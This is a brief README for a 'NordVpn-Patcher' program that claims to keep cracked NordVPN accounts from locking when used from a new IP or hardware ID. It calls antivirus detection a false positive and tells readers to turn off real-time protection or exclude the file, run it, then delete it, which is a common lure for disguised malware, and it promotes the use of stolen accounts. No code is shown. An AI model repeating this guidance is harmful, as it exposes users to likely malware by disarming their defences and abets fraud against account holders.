# NordVpn-Patcher
Program for patching cracked accounts from locking themselves when used from a new IP/HWID.
It will be marked as a virus by AVs, but that is just a false positive. If you have a specific antivirus, go into the settings and turn off "Real Time Protection", or create an exclusion and select NordPatcher.
After running NordPatcher once (while NordVPN is open on your computer), you can delete the file. Then you can reenable your AV.
